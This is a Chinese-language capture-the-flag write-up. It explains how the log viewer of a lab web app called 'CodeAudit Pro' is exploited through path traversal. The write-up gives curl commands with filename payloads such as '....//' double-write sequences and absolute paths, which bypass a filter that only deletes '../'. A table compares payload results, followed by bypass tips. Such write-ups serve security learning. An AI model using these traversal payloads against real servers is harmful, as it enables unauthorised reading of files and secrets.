## 题目原文

> 公司最近部署了CodeAudit Pro代码审计平台，用于内部代码质量检测。开发团队声称这个系统非常安全，只开放了日志查看功能。Flag存放在服务器上的某个位置，据说只有系统管理员才能访问。你能找到它吗？

## 题解

### 入口与指纹

`Werkzeug/3.1.8` + `Python/3.9.25`。登录页写着测试账号：

```
测试账号: auditor / 任意密码
```

登录后控制台只有两个功能：`/logs` 日志查看、`/logout`。

### 关键观察

**1. 日志查看器自己承认 WAF 很弱。**

`/logs` 页面写着：

```
🛡️ WAF 已启用
系统已启用WAF防护，将过滤路径遍历字符（如 ../）
日志目录: /var/log/app/
日志文件列表 ...
自定义文件名 [____] 读取日志
```

前端调两个接口：

```
GET  /api/logs/list
POST /api/logs/read   （multipart，字段 filename）
```

**2. 过滤只做「删除 `../`」，没有规范化。**

`filename` 被拼进 `/var/log/app/` 下读取，过滤是简单的 `../` 替换/删除。`....//` 删掉中间的 `../` 之后又拼回 `../`，所以能穿越。绝对路径同样有效（没有被拒绝）。

### 利用链

**Step 1：用测试账号登录。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST -d 'username=auditor&password=x' "http://$T/login"
```

**Step 2：确认读日志正常，再试穿越。**

```bash
curl -s -b cj "http://$T/api/logs/list"
# {"logs":[{"name":"access.log",...},{"name":"app.log",...},{"name":"error.log",...}]}

curl -s -b cj -F 'filename=app.log' "http://$T/api/logs/read"
# {"content":"[2024-01-01 10:00:00] INFO: Application started ...","success":true}
```

**Step 3：穿越读 flag。**

```bash
curl -s -b cj -F 'filename=....//....//....//....//challenge/flag.txt' \
  "http://$T/api/logs/read"
# {"content":"flag{1ef20e67-bd23-450b-b735-2b2accac5da9}",...,"success":true}

curl -s -b cj -F 'filename=/challenge/flag.txt' "http://$T/api/logs/read"
# 同样返回 flag
```

三种写法的结果：

| `filename` | 结果 |
| --- | --- |
| `app.log` | 正常日志 |
| `../../../../challenge/flag.txt` | `文件不存在`（`../` 被删） |
| `....//....//....//....//challenge/flag.txt` | **flag** |
| `/challenge/flag.txt` | **flag**（绝对路径未拦） |
| `..%2f..%2f..%2f..%2fchallenge%2fflag.txt` | `文件不存在`（不做 URL 解码） |

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/challenge/flag.txt`，经 `/api/logs/read` 的 `filename` 路径穿越读取 |

### 复盘

- **页面自己写「过滤 ../」时，先试双写。** 单次替换/删除是这类过滤的通病，`....//` 是最小成本验证。
- **绝对路径要单独试。** 本题 `/challenge/flag.txt` 直接通过，说明过滤只针对 `../` 子串，没有做路径规范化或白名单。
- **错误信息能区分「被过滤」和「不存在」。** `文件不存在` 说明请求已经过了过滤层，只是路径不对；`400/404` 才是被拒。
- **题目说「只开放日志查看」时，日志查看本身往往就是文件读取原语。** 不需要再找别的入口。
